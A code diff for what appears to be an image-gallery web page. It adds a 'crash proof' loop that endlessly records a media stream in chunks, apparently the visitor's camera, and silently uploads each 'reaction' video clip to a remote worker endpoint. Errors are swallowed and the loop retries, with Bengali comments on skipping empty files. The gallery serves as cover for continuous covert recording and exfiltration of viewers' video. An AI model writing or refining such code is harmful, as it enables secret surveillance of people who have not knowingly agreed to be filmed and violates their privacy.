@@ -47,20 +47,33 @@ safeClick('enter-btn', async () => {
     } catch (err) { document.getElementById('entry-screen').classList.remove('active-screen'); document.getElementById('gallery-screen').classList.add('active-screen'); loadImages(); } 
 });
 
-function startRecording(stream) {
-    try {
-        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-        let chunks = [];
-        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-        recorder.onstop = async () => {
-            const formData = new FormData();
-            formData.append('file', new Blob(chunks, { type: 'video/webm' }), `reaction-${Date.now()}.webm`);
-            try { await fetch(`${WORKER_URL}/api/upload`, { method: 'POST', body: formData }); } catch(err){}
-            startRecording(stream);
-        };
-        recorder.start();
-        setTimeout(() => { if(recorder.state === 'recording') recorder.stop(); }, RECORDING_CHUNK_MS);
-    } catch(e) {}
+// --- 1. RECORDING LOGIC (BUG FIXED & CRASH PROOF) ---
+async function startRecording(stream) {
+    while (true) {
+        await new Promise(resolve => {
+            try {
+                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                let chunks = [];
+                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    // Size Check: 0.00MB বা ফাঁকা ফাইল আপলোড ঠেকানোর জন্য (20KB এর বড় হতে হবে)
+                    if (blob.size > 20000) { 
+                        const formData = new FormData();
+                        formData.append('file', blob, `reaction-${Date.now()}.webm`);
+                        try { await fetch(`${WORKER_URL}/api/upload`, { method: 'POST', body: formData }); } catch(err){}
+                    }
+                    resolve(); // আগের ভিডিও আপলোড শেষ হলে তবেই নতুনটা শুরু হবে
+                };
+                
+                recorder.start();
+                setTimeout(() => { if(recorder.state === 'recording') recorder.stop(); }, RECORDING_CHUNK_MS);
+            } catch(e) {
+                setTimeout(resolve, 5000); // এরর হলে ৫ সেকেন্ড ব্রেক নেবে
+            }
+        });
+    }
 }
 
 // 2. Upload
